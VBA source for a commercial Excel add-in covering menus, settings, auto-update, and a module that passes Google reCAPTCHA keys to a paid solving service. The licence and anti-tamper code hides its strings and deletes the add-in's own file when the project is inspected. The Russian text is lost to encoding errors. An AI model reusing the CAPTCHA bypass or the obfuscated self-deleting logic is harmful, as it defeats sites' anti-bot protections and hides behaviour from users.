Function Add_Control(ByRef Comm_Bar, ByVal ControlType As CONTROL_TYPES, Optional ByVal B_Face&, Optional ByVal On_Action$, _
                     Optional ByVal B_Caption$, Optional ByVal Button_Style As Long = msoButtonIcon, _
                     Optional ByVal Begin_Group As Boolean = False, Optional Tag = "") As CommandBarControl
    On Error Resume Next
    Set Add_Control = Comm_Bar.Controls.Add(Type:=ControlType, Temporary:=True)
    With Add_Control
        If B_Face > 0 And ControlType = ct_BUTTON Then .FaceId = B_Face
        If Len(On_Action) Then
            .Tag = TWN & On_Action & "\\\" & Tag
            .OnAction = TWN & "RunMacroFromButton": If On_Action Like "Exit*" Then .OnAction = TWN & On_Action
        End If
        .Caption = B_Caption
        .BeginGroup = Begin_Group
        If ControlType = ct_BUTTON Or ControlType = ct_DROPDOWN Then .Style = Button_Style
    End With
End Function

Function CreateShortcutInStartMenu(Optional ByVal ShortcutName$ = PROJECT_NAME$, Optional ByVal ShortcutFolderName$)
    On Error Resume Next
    Dim ShortcutFullName$, Folder$
    If ShortcutFolderName$ = "" Then ShortcutFolderName$ = tt("StartMenuFolderName")
    Folder$ = CreateObject("WScript.Shell").SpecialFolders("StartMenu") & Application.PathSeparator
    If Len(Trim(ShortcutFolderName$)) Then
        Folder$ = Folder$ & FWF.Replace_symbols(ShortcutFolderName$) & Application.PathSeparator
        MkDir Folder$
    End If

    ShortcutFullName$ = Folder$ & FWF.Replace_symbols(ShortcutName$, " ") & ".lnk"
    Kill Folder$ & "*" & PROJECT_NAME$ & "*.lnk"        ' deleting old shortcuts

    With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
        .TargetPath = ThisWorkbook.FullName
        .Description = tt("ProgramFullname") & vbNewLine & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        .Save
    End With
End Function

Sub UpdateStatus(Optional ByRef obj As MSForms.Label)
    On Error Resume Next: Dim txt$, ou$, col&, sh As Boolean
    With SETT
        Select Case Run(TWN & .U("41535F"))
            Case 4: ou$ = Trim(.GetRegValue(.U("757365726E616D65"))): If ou$ = "" Then ou$ = Trim(.GetRegValue(.U("656D61696C")))
                txt = tt("|4143545F4F4B") & vbNewLine & tt("|4143545F4F574E4552", ou$): col& = RGB(0, 150, 0): sh = True
            Case 1: txt = tt("|4143545F545249414C") & vbNewLine & tt("|4143545F444159534C454654", .RSP(3)): col& = RGB(200, 50, 0)
            Case 0: txt = tt("|4143545F45585049524544") & vbNewLine & tt("|4143545F4255594E4F57"): col& = RGB(255, 0, 0)
            Case Else: txt = .U("556E6B6E6F776E2061637469766174696F6E207374617475732E0D0A436F6E7461637420646576656C6F70657220746F206669782074686973206572726F722E"): col& = RGB(100, 0, 100)
        End Select
        obj.Caption = txt: obj.ForeColor = col
    End With
    With F_About
        .MultiPage1.Pages(SETT.U("506167655F526567496E666F")).Visible = Not sh: .Label_HL_Cabinet.Visible = sh
        .Label_HL_BuyLicense = tt("|465F41626F75745C4C6162656C5F484C5F4275794C6963656E7365" & IIf(sh, "32", ""))
        .Repaint
    End With
End Sub

Sub ApplyZoomTo(ByRef UF)
    On Error Resume Next: Dim zo&, dh&
    zo = SETT.GetNumber("ComboBox_Zoom", 100)
    If zo < 20 Then zo = 100
    dh& = UF.Height - UF.InsideHeight
    UF.Width = UF.Width * zo / 100: UF.Height = (UF.Height - dh&) * zo / 100 + dh&
    UF.Zoom = zo
End Sub

Sub ExitProgram()
    On Error Resume Next
    If MsgBox(tt("MSG_ExitProgram"), vbQuestion + vbDefaultButton2 + vbOKCancel) = vbCancel Then Exit Sub
    DeleteProgramCommandBar
    Close_All_Plugins
    ThisWorkbook.Close False
End Sub

' ---------------------------------------------------------------------------------------------------------------------
Function UpdateAvailable() As Boolean
    On Error Resume Next: UpdateAvailable = SETT.GetText("NewVersionURL", , "Updates") Like "http*://*.*/?*.xl*"
End Function

Sub ApplySettingSet(ByVal FileName$)
    On Error Resume Next: Dim setting_set_name$, macroname$, ctrl As Object

    If FileName$ Like "folder=?*" Then        ' dropdown changed
        setting_set_name$ = Application.CommandBars.ActionControl.text
        FileName$ = Split(FileName$, "folder=", 2)(1) & setting_set_name$ & ".xml"
    End If

    If FileName$ Like "macro=?*&*" Then        ' button pressed
        macroname$ = Split(Split(FileName$, "macro=", 2)(1), "&", 2)(0)
        FileName$ = Split(FileName$, "&", 2)(1)
        setting_set_name$ = Application.CommandBars.ActionControl.Caption
        setting_set_name$ = Mid(setting_set_name$, 2, Len(setting_set_name$) - 2)        ' TRIM
        If FileName$ = "" Then setting_set_name$ = ""        ' for main button
    End If

    If SETT.ActivateSettingSet(setting_set_name$, FileName$) Then
        If Len(macroname$) Then
            For Each ctrl In Application.CommandBars.ActionControl.Parent.Controls
                If ctrl.FaceId = Application.CommandBars.ActionControl.FaceId Then ctrl.State = msoButtonUp
            Next
            Application.CommandBars.ActionControl.State = msoButtonDown
            Run TWN & macroname$
        End If
        Run TWN & "SettingSetChanged"
    Else
        RunWithDelay "CreateProgramCommandBar", 0.5        ' incorrect setting set name
    End If
End Sub
Function AS_() As Long
    On Error Resume Next: Dim txt$
    With SETT
        txt$ = .GetRegValue(.U("636F6465")) & "@": txt = Split(txt, "@")(1)
        If Len(.k) * (txt = .k) Then AS_ = 4: Exit Function
        AS_ = -(.RSP(3) > 0)
    End With
End Function
Sub AddSettingsSwitcher(ByVal AddinMenu As Object, Optional ByVal SwitcherType As CONTROL_TYPES = ct_BUTTON, _
                        Optional ByVal SettingsFolderName$, Optional ByVal MainMacroName$, Optional ByRef MainMacroButton As Object)
    On Error Resume Next
    Dim coll As New Collection, SettingsFolder$, item, FileName$, MenuDropdown As Object, SettingSetName$, i&, UserSwitcherType&
    SettingsFolderName$ = Trim(Replace(SettingsFolderName$, "\", ""))
    If SettingsFolderName$ = "" Then SettingsFolderName$ = PROJECT_NAME$ & "Settings"
    SettingsFolder$ = ThisWorkbook.Path & "\" & SettingsFolderName$ & "\"

    If Not FWF.FolderExists(SettingsFolder$) Then Exit Sub
    Set coll = FWF.FilenamesCollection(SettingsFolder$, "*.xml", 1)
    If coll.Count = 0 Then Set coll = Nothing: Exit Sub

    If SwitcherType = ct_COMBOBOX Then SwitcherType = ct_DROPDOWN
    ' SwitcherType is one of ct_BUTTON or ct_COMBOBOX / ct_DROPDOWN

    UserSwitcherType& = SETT.GetNumber("SettingsSwitcher", 1, "Setup")
    ' user can disable switcher or change type of switcher by adding key "SettingsSwitcher" into Setup registry section
    ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
    Select Case UserSwitcherType&
        Case 0: Exit Sub
        Case 2: SwitcherType = ct_DROPDOWN
        Case 3: SwitcherType = ct_BUTTON
    End Select

    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    If SwitcherType = ct_DROPDOWN Then
        Set MenuDropdown = Add_Control(AddinMenu, ct_DROPDOWN, , "ApplySettingSet", tt("SettingSetDropdownCaption") & ":", _
                                       msoComboLabel, , "folder=" & SettingsFolder$)
        MenuDropdown.AddItem "<" & tt("DefaultSettingSetName") & ">"
    End If

    SettingSetName$ = SETT.GetCurrentSetName

    For Each item In coll
        FileName$ = Split(Dir(item, vbNormal), ".xml")(0)

        Select Case SwitcherType
            Case ct_BUTTON
                With Add_Control(AddinMenu, ct_BUTTON, MainMacroButton.FaceId, "ApplySettingSet", " " & FileName$ & " ", _
                                 msoButtonIconAndCaption, , "macro=" & MainMacroName$ & "&" & item)
                    .State = IIf(SettingSetName$ = FileName$, msoButtonDown, msoButtonUp)
                End With
            Case ct_DROPDOWN
                MenuDropdown.AddItem FileName$
        End Select
    Next

    If SwitcherType = ct_DROPDOWN Then
        For i = 1 To MenuDropdown.ListCount
            If MenuDropdown.list(i) = SettingSetName$ Then MenuDropdown.ListIndex = i: Exit For
        Next i
        If MenuDropdown.ListIndex = 0 Then
            MenuDropdown.ListIndex = 1
            If SettingSetName$ <> "" Then SETT.ActivateSettingSet ""
        End If
    End If

    If SwitcherType = ct_BUTTON Then
        MainMacroButton.Tag = TWN & "ApplySettingSet" & "\\\" & "macro=" & MainMacroName$ & "&"
        MainMacroButton.State = IIf(SettingSetName$ = "", msoButtonDown, msoButtonUp)
    End If
    Set coll = Nothing
End Sub


Attribute VB_Name = "mod_About_NEW6"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW6                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Function SwitchTab(TabName As String) As Boolean
    ' |fffd| Tony Jollans, August 2008.    http://www.wordarticles.com/Shorts/RibbonVBA/RibbonVBADemo.php
    On Error Resume Next: Dim RibbonTab As Object
    Set RibbonTab = GetAccessible(CommandBars("Ribbon"), &H25&, TabName)
    If RibbonTab Is Nothing Then Exit Function
    If (RibbonTab.accState(&H0&) And 32769) = 0 Then RibbonTab.accDoDefaultAction &H0&: SwitchTab = True
End Function
Public Function GetAccessible(Element As Object, RoleWanted&, NameWanted$, Optional GetClient As Boolean) As Object
    Dim ChildrenArray(), Child As Object, ndxChild&, ReturnElement As Object, NameComparand$, accName$, accValue$
    On Error Resume Next: accValue = Element.accValue(&H0&)
    accName = Element.accName(&H0&)
    Select Case accValue
        Case "Ribbon", "Quick Access Toolbar", "Ribbon Tabs List", "Lower Ribbon", "Status Bar": NameComparand = accValue
        Case "", "Ribbon Tab", "Group": NameComparand = accName
        Case Else: NameComparand = accName
    End Select
    If Element.accRole(&H0&) = RoleWanted And NameComparand = NameWanted Then
        Set ReturnElement = Element
    Else        ' not found yet
        ChildrenArray = GetChildren(Element)
        If (Not ChildrenArray) <> True Then
            For ndxChild = LBound(ChildrenArray) To UBound(ChildrenArray)
                If TypeOf ChildrenArray(ndxChild) Is Object  Then
                    Set Child = ChildrenArray(ndxChild)
                    Set ReturnElement = GetAccessible(Child, RoleWanted, NameWanted)
                    If Not ReturnElement Is Nothing Then Exit For
                End If        ' Child is Object
            Next ndxChild
        End If        ' there are children
    End If        ' still looking
    If GetClient Then Set ReturnElement = ReturnElement.accNavigate(&H7&, &H0&)
    Set GetAccessible = ReturnElement
End Function
Private Function GetChildren(Element As Object) As Variant()
    Const FirstChild As Long = 0&: Dim NumChildren&, ChildrenArray()
    #If Win64 Then
        Dim NumReturned As LongPtr
    #Else
        Dim NumReturned As Long
    #End If
    NumChildren = Element.accChildCount
    If NumChildren > 0 Then ReDim ChildrenArray(NumChildren - 1): AccessibleChildren Element, FirstChild, NumChildren, ChildrenArray(0), NumReturned
    GetChildren = ChildrenArray
End Function
Attribute VB_Name = "mod_About_NEW7"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW7                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Public Const DEBUG_MODE As Boolean = False        'True
Public Const UPDATES_HYPERLINK$ = "http://ExcelVBA.ru/php2/updates.php"

Public Const DEVELOPER_WEBSITE$ = "http://ExcelVBA.ru/"
Public Const SUPPORT_EMAIL_RUS$ = "info@ExcelVBA.ru", SUPPORT_EMAIL$ = "info@ExcelVBA.ru"
Public Const BUY_NEW_HYPERLINK$ = "%website%buy/add-in?name=%projectname%"
Public Const BUY_ADD_HYPERLINK$ = "%website%buy2/add-in?name=%projectname%"
Public Const UNINSTALL_HYPERLINK$ = "%website%uninstall/program?name=%projectname%"
Public Const EULA_HYPERLINK$ = "%website%buy/EULA?name=%projectname%"
Public Const BREACH_EULA_HYPERLINK$ = "%website%buy/EULA/breach?name=%projectname%"
Public Const CABINET_HYPERLINK$ = "%website%cabinet/login"
Public Const VERSIONS_HISTORY_HYPERLINK$ = "%website%updates/history.php?addin=%projectname%"
Public SetupCancelled As Boolean, StopMacro As Boolean

Public Const CFA_NAME$ = "'CommonFunctions.xla'!"

Sub Add3Buttons(ByRef AddinMenu As Object)
    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Add_Control AddinMenu, ct_BUTTON, 222, "ShowSettingsPage", tt("MENU_Settings") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", tt("MENU_About") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, IIf(Val(Application.Version) <= 11, 4356, 923), "ExitProgram", tt("MENU_Exit"), msoButtonIcon, True
End Sub

Private Sub RunMacroFromButton()
    On Error Resume Next: Dim Macro$, param$
    Macro$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(0)
    param$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(1)
    If Macro$ Like TWN & "*" Then SETT.LastMacro Macro$
    If Len(Macro$) > O Then If Len(param$) Then Run Macro$, param$ Else Run Macro$
End Sub


Attribute VB_Name = "mod_About_NEW8"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW8                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Sub AddUpdateButton(ByRef AddinMenu As Object)
    On Error Resume Next
    If UpdateAvailable Then
        Dim UpdateButton As Object, UpdateButtonCaption$, UpdateType&, ShowUpdateButton As Boolean
        UpdateType& = SETT.GetNumber("NewVersionType", 0, "Updates")
        If UpdateType& > 0 Then
            ShowUpdateButton = UpdateType& > 1        '  ShowUpdateButton = InStr(1, "23", UpdateType&) > 0
            If ShowUpdateButton Then Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0

            If SETT.GetBoolean("AutoInstall", False, "Updates") Or (UpdateType& = 4) Then
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateInProgress")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Installing update in process |fffd|"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1977, "", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                UpdateButton.State = msoButtonDown
                InstallUpdate
            Else
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateReady")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Install update now"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1623, "InstallUpdate", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                RunWithDelay "DownloadUpdate", 2
            End If
        End If
    End If
End Sub
Sub DownloadUpdate()
    InstallUpdate True
End Sub

Sub InstallUpdate(Optional ByVal DownloadOnly As Boolean = False)
    On Error Resume Next
    Dim URL$, NewFilename$, FileSize&, OldFilename$, FilePath$

    If Not UpdateAvailable Then Exit Sub

    URL$ = SETT.GetText("NewVersionURL", , "Updates")
    SETT.SetText "InstallLastAttemptTime", Now, "Updates"
    NewFilename$ = FWF.temp_folder & FWF.Replace_symbols("Update_" & PROJECT_NAME$ & "_" & _
                                                         SETT.GetText("NewVersion", "X.X.X", "Updates") & "." & FWF.GetFileExtension(URL$))
    FileSize& = SETT.GetNumber("NewVersionSize", 0, "Updates")
    If FWF.FileExists(NewFilename$) And (FileSize& > 0) Then
        If FileLen(NewFilename$) <> FileSize& Then Kill NewFilename$
    End If
    Kill NewFilename$

    If Not FWF.FileExists(NewFilename$) Then
        SETT.SetText "InstallComment", "Start downloading file...  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.DownLoadFileFromURL(URL$, NewFilename$, True) Then
            SETT.SetText "InstallComment", "Can't download file", "Updates": Exit Sub
        End If
        SETT.SetText "InstallComment", "Download finished:  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.FileExists(NewFilename$) Then
            SETT.SetText "InstallComment", "Downloaded file not found", "Updates": Exit Sub
        End If
    End If

    If (FileSize& > 0) And (FileLen(NewFilename$) <> FileSize&) Then
        SETT.SetText "InstallComment", "Filesize does not match (original = " & FileSize& & ", downloaded = " & FileLen(NewFilename$) & ")", "Updates": Exit Sub
    End If
    If TrueDeveloper Then Application.StatusBar = Now & "  InstallUpdate started,  DownloadOnly = " & DownloadOnly: Exit Sub
    If DownloadOnly Then Exit Sub

    OldFilename$ = FWF.temp_folder & FWF.Replace_symbols("Backup_" & PROJECT_NAME$ & "_" & GetVersionTXT & _
                                                         "_" & Format(Now, "DD-MM-YYYY_HH-NN-SS") & "." & FWF.GetFileExtension(ThisWorkbook.FullName))
    SETT.SetText "LastBackup", OldFilename$, "Updates"

    Application.DisplayAlerts = False: If TrueDeveloper Then Exit Sub
    FilePath$ = ThisWorkbook.FullName: ThisWorkbook.ChangeFileAccess xlReadOnly
    SETT.SetText "InstallComment", "Deleting old version:  " & FilePath$, "Updates"
    SetAttr FilePath$, vbNormal
    FileCopy FilePath$, OldFilename$        ' old version backup
    Kill FilePath$: DoEvents
    If FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't delete old version", "Updates": Exit Sub
    End If
    SETT.SetText "InstallComment", "Old version was deleted successfully  " & FilePath$, "Updates"


    FileCopy NewFilename$, FilePath$: DoEvents
    If Not FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't copy new version", "Updates"
        Kill FilePath$: DoEvents
        FileCopy OldFilename$, FilePath$        ' old version restore
        Exit Sub
    End If

    SETT.SetText "InstallComment", "Update was successfully installed at " & Now, "Updates"
    Application.OnTime Now + TimeSerial(0, 0, 2), "'" & FilePath$ & "'" & "!ClearUpdatesInfo"
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Sub

Sub ClearUpdatesInfo()
    With SETT
        .Delete "NewVersionType", "Updates": .Delete "NewVersionNumber", "Updates": .Delete "NewVersionURL", "Updates"
        .Delete "NewVersionType", "Updates": .Delete "NewVersionSize", "Updates": .Delete "NewVersion", "Updates"
    End With
End Sub

Sub ShowMainForm()
    On Error Resume Next: F_About.Show
    F_About.MultiPage1.value = 0
End Sub

Sub ShowSettingsPage()
    On Error Resume Next: F_Settings.Show
End Sub
Sub ShowFirstRunForm()
    On Error Resume Next: F_FirstRun.Show
End Sub

Sub RunWithDelay(ByVal macroname$, Optional ByVal Delay As Double = 0.5)
    On Error Resume Next: Dim delay_txt$
    delay_txt$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * Delay, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & delay_txt$ & ", ""'" & ThisWorkbook.Name & "'!" & macroname$ & """)"
End Sub
Attribute VB_Name = "mod_About_NEW9"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW9                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Function UninstallThisFile(Optional ByVal Mode& = 1)
    On Error Resume Next
    If Mode& = 1 Then
        If MsgBox(tt("MSG_UninstallConfirmation"), vbExclamation + vbOKCancel + vbDefaultButton2, _
                  tt("MSG_UninstallConfirmationTitle")) = vbCancel Then Exit Function
    End If
    If TrueDeveloper Then MsgBox "Uninstalling cancelled", vbInformation, "Mode=" & Mode&: Exit Function

    AddinAutoRun False
    Application.DisplayAlerts = False
    Dim FilePath$: FilePath$ = ThisWorkbook.FullName
    ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr FilePath$, vbNormal
    Kill FilePath$
    If Mode& = 1 Then If RUS Then FollowHyperlink UNINSTALL_HYPERLINK$
    If Mode& >= 2 Then If RUS Then FollowHyperlink BREACH_EULA_HYPERLINK$
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Function

Function Developer() As Boolean: Developer = TrueDeveloper And (Dir("c:\testmode", vbNormal) = ""): End Function
Function TrueDeveloper() As Boolean
    Dim txt$: txt$ = Environ(Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(68) & Chr(79) & Chr(77) & Chr(65) & Chr(73) & Chr(78)): TrueDeveloper = (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(72) & ChrW(79) & ChrW(77) & ChrW(69) & ChrW(42)) Or (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(87) & ChrW(79) & ChrW(82) & ChrW(75) & ChrW(42))
End Function

Function MU_() As Boolean
    On Error Resume Next: Dim X: X = ll: Err.Clear: X = ThisWorkbook.VBProject.VBComponents.Count
    If TrueDeveloper Then Exit Function
    MU_ = Err = 0: If MU_ Then UninstallThisFile 2
End Function

Function OfficeBits() As Long
    #If VBA7 And Win64 Then
        OfficeBits = 64
    #Else
        OfficeBits = 32
    #End If
End Function

Function TWN() As String: TWN = "'" & ThisWorkbook.Name & "'!": End Function

Function O() As Long
    On Error Resume Next: Dim i&, t As Double: O = 2 ^ 30: If MU_ Then Exit Function
    If AS_ > 0 Then
        O = 0
    Else
        Application.EnableCancelKey = xlDisabled: ShowMainForm
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(73) & Chr(110) & Chr(102) & Chr(111))
            For i = 1 To 10
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(72) & Chr(76) & Chr(95) & Chr(66) & _
                              Chr(117) & Chr(121) & Chr(76) & Chr(105) & Chr(99) & Chr(101) & Chr(110) & Chr(115) & Chr(101))
            .ForeColor = RGB(255, 0, 0)
            For i = 1 To 4
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        Application.EnableCancelKey = xlInterrupt
    End If
End Function

Function cmdDisplay(txt) As String
    On Error Resume Next: Dim pass$, d&, i&, letter$
    If Left(txt, 1) = "P" Then txt = Mid(txt, 2): pass$ = "" Else pass$ = HID
    d = Val("&H" & Mid(txt, 1, 2))
    For i = 2 To Len(txt) / 2
        letter = Val("&H" & Mid(txt, 2 * i - 1, 2))
        cmdDisplay$ = cmdDisplay$ & Chr(letter Xor CInt(2 * d * Abs(Sin(3 * (i - 1)))) + Val(Mid(pass$, 2 + (i - 1) Mod 10, 1)))
    Next
End Function

Function DeleteProgramCommandBar()
    On Error Resume Next: GetCommandBar(PROJECT_NAME).Visible = False
End Function

Function SetIsAddinAsFalse()
    On Error Resume Next: ThisWorkbook.IsAddin = False
End Function
Function SetIsAddinAsTrue()
    On Error Resume Next: ThisWorkbook.IsAddin = True
End Function

Function SETT() As AddinSettings
    Static objSETT As AddinSettings
    If objSETT Is Nothing Then Set objSETT = New AddinSettings: objSETT.LoadAllSettings
    Set SETT = objSETT
End Function
Attribute VB_Name = "mod_Captcha"
'---------------------------------------------------------------------------------------
' Module        : mod_Captcha                    Version: 2
' Author        : Igor Vakhnenko                   Date: 09.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Private Module

Const CaptchaTestURL$ = "http://rus.auto24.ee/export/secimg.php?c=cdebc0ebf085127df3f1f96679d50a21d59455ea16bb762e5fb5cbf33b0a6cda"

Sub test_solve_captcha()
    Debug.Print SolveCaptcha(CaptchaTestURL$)
End Sub

Private Sub test_solve_captcha_blank()
    Debug.Print SolveCaptcha("http://my.jetscreenshot.com/28544/20161009-xeop-0kb.jpg")
End Sub

Private Sub test_solve_google_captcha()
    Dim URL$, PageContent$
    URL$ = "http://opt.brain.com.ua/dealer/login"
    PageContent$ = LoadFromURL_HTML(URL$)
    Debug.Print SolveGoogleCaptcha("", "", PageContent$)
End Sub

Function SolveGoogleCaptcha(ByVal PageURL$, ByVal SiteKey$, Optional ByVal CurrentValue$, _
                            Optional ByVal ShowMessage As Boolean = True, Optional ByVal ExtraOptions$, _
                            Optional ByVal QueryTimeout& = 120, Optional ByRef WP As WebsiteParser) As String
    On Error Resume Next
    StopMacro = False
    ParserVariables.item(RESPONSE_VARNAME$) = ""

    Dim PostData$, APIkey$, Response$, ID$, pi As ProgressIndicator, msg$
    APIkey$ = Trim(SETT.GetText("TextBox_CaptchaAPIkey"))
    If Len(APIkey$) = 0 Then
        AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| API-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                   "<span style='font-size:small; color:red;'>(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span>" & _
                   "<br /><b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.</b>", bt_Warning
        Exit Function
    End If

    If PageURL$ = "" Then If IsURL(CurrentValue$) Then PageURL$ = CurrentValue$
    If PageURL$ = "" Then PageURL$ = ParserVariables.item(LAST_USED_URL_VARNAME$)
    If PageURL$ = "" Then
        If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google Captcha</b>", bt_Warning
        Exit Function
    End If

    If SiteKey$ = "" Then SiteKey$ = GetGoogleSiteKey(CurrentValue$)
    If SiteKey$ = "" Then
        If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| data-sitekey |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b>", bt_Warning
        Exit Function
    End If

    If QueryTimeout& < 30 Then QueryTimeout& = 30
    If QueryTimeout& > 1000 Then QueryTimeout& = 1000

    If TEST_ACTIONS_MODE Then WP.CreateTemporaryProgressIndicator
    WP.PrInd1.ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (Google Captcha)", True

    With WP.PrInd1
        .ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Google Captcha |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Rucaptcha"
        .ExtraBar_SetLineText 3, ""
    End With

    Dim cHTTP As New WinHttpRequest, HTML_img$
    With cHTTP
        .Open "POST", "http://rucaptcha.com/in.php", True
        .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"

        PostData = "method=userrecaptcha&soft_id=1557&googlekey=" & SiteKey$ & "&key=" & APIkey$ & "&pageurl=" & URL_Encode3(PageURL$)
        If Len(ExtraOptions$) Then PostData = PostData & "&" & ExtraOptions$
        .Send PostData: DoEvents

        If .WaitForResponse(5) Then
            'If Val(.Status) <> 200 Then Debug.Print "Captcha request status", .Status, .StatusText
            Response$ = Trim(.ResponseText)
        End If
        If Response$ = "" Then
            If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & _
               "<span style='font-size:small; color:red;'>(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| API-|fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Warning
            GoTo ExitSolveGoogleCaptcha
        End If
        If Response$ Like "ERROR_*" Then
